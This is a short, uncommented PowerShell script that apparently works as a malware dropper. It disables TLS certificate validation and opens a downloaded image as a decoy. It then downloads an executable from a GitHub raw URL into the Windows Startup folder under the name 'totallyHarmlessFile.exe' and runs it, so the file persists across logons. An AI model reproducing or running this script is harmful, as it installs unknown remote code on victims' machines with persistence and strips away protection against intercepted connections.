add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
                return true;
            }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy



[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12



Set-Location $env:TEMP

Invoke-WebRequest -URI "https://raw.githubusercontent.com/schokoring/schokocloud/main/gatze.jpg"  -OutFile gatze.jpg 
Start-Process gatze.jpg


Set-Location "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest "https://raw.githubusercontent.com/schokoring/schokocloud/main/client_win7.exe" -OutFile totallyHarmlessFile.exe
Start-Process totallyHarmlessFile.exe